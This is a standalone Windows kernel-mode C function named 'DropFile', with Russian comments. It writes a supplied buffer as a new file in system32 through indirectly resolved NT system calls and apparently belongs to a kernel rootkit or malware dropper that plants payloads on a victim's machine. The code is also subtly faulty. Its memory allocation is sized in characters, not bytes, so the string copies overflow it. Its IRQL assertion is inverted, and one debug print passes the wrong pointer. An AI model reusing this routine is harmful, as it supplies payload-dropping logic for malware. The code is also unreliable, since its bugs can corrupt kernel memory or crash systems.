BOOLEAN DropFile(ULONG_PTR	pFileBuffer,
				 ULONG		nFileBufferSize,
				 PWCHAR		pwcFileName)
{
	/*
		1) Create file
			.if exits ( DELETE FILE )
		2) Write Buffer to file
		3) Close File
	*/
	NTSTATUS nStatus = STATUS_UNSUCCESSFUL;
	BOOLEAN bStatus = FALSE;
	OBJECT_ATTRIBUTES ObjAttr = { 0 };
	IO_STATUS_BLOCK StatusBlock = { 0 };
	HANDLE	hFile = NULL,
			hEvent= NULL;
	UNICODE_STRING usFileName;
	LARGE_INTEGER lInt = { 0 };

	usFileName.Buffer = ExAllocatePoolWithTag(NonPagedPool,wcslen(L"\\SystemRoot\\system32\\") + wcslen(pwcFileName) + 2,'TEEL');
	if(!usFileName.Buffer)
	{
		Dbg("DropFile : error allocate memory %s[%d]\n",__FILE__,__LINE__);
		bStatus = FALSE;
		goto end;
	}

	wcscpy(usFileName.Buffer,L"\\SystemRoot\\system32\\");
	wcscat(usFileName.Buffer,pwcFileName);
	usFileName.Length = (USHORT)wcslen(usFileName.Buffer) * sizeof(WCHAR);
	usFileName.MaximumLength = usFileName.Length + 2;

	Dbg("DropFile : Create file %ws\n",usFileName.Buffer);
	InitializeObjectAttributes(&ObjAttr,&usFileName,OBJ_CASE_INSENSITIVE | OBJ_KERNEL_HANDLE,NULL,NULL);

	ASSERT(KeGetCurrentIrql() != PASSIVE_LEVEL);

	__try {
		nStatus = g_NtCreateFile(
		&hFile,SYNCHRONIZE | FILE_WRITE_DATA,&ObjAttr,&StatusBlock,0,
		FILE_ATTRIBUTE_NORMAL,0, FILE_CREATE, FILE_SYNCHRONOUS_IO_NONALERT, NULL, 0);
	}	__except(EXCEPTION_EXECUTE_HANDLER)
	{
		Dbg("DropFile : NtCreateFile except! return FALSE\n");
		bStatus = FALSE;
		goto end;
	}


	if(nStatus != STATUS_SUCCESS)
	{
		bStatus = FALSE;
		Dbg("DropFile : NtCreateFile error : error create file STATUS[0x%08X] IoStatusBlock.Status[0x%08X]\n",nStatus,StatusBlock.Status);
		goto end;
	}
	
	// fix it, mix create and write
	ZwClose(hFile);
	nStatus = g_NtCreateFile(&hFile,FILE_WRITE_DATA + SYNCHRONIZE,&ObjAttr,&StatusBlock,
		0,0, FILE_SHARE_READ, FILE_OPEN, FILE_SYNCHRONOUS_IO_NONALERT, NULL, 0);
	if(nStatus != STATUS_SUCCESS)
	{
		bStatus = FALSE;
		Dbg("DropFile : NtCreateFile error : error open file 0x%08X\n",nStatus);
		goto end;
	}

	nStatus = g_NtCreateEvent(&hEvent,EVENT_ALL_ACCESS,0,NotificationEvent,FALSE);
	if(nStatus != STATUS_SUCCESS)
	{
		bStatus = FALSE;
		Dbg("DropFile : NtCreateEvent error : 0x%08X\n",nStatus);
		goto end;
	}

	__try {
		nStatus = g_NtWriteFile(hFile,hEvent,NULL,NULL,&StatusBlock,pFileBuffer,nFileBufferSize,NULL,NULL);
		if(nStatus == STATUS_SUCCESS && StatusBlock.Information == nFileBufferSize)
		{
			Dbg("DropFile : Data[0x%08X],Size[0x%08X] succefull writed to file %ws\n",
				pFileBuffer,nFileBufferSize,&usFileName.Buffer);
			bStatus = TRUE;
		}	else if (nStatus == STATUS_PENDING)
		{
			// ждем конца операции записи буфера в файл
			nStatus = g_NtWaitForSingleObject(hEvent,TRUE,0);
			if(nStatus == STATUS_SUCCESS)
			{
				Dbg("DropFile : g_NtWaitForSingleObject returned STATUS SUCCESS, Data writed\n");
				bStatus = TRUE;
			}	else	{
				Dbg("DropFile : g_NtWaitForSingleObject : return status 0x%08X\n",nStatus);
				bStatus = FALSE;
				goto end;
			}
		}
	}	__except(EXCEPTION_EXECUTE_HANDLER)
	{
		Dbg("DropFile : NtWriteFile exception\n");
		bStatus = FALSE;
		goto end;
	}

	ZwClose(hFile);
	ZwClose(hEvent);

end:
	if(!bStatus)
	{
		//+ Чистим ресурсы
		__try {
			if(hFile)
				ZwClose(hFile);
			if(hEvent)
				ZwClose(hEvent);
		}	__except(EXCEPTION_EXECUTE_HANDLER)
		{
			Dbg("DropFile : произошло исключение при очистке ресурсов\n");
			return FALSE;
		}
	}

	return bStatus;
}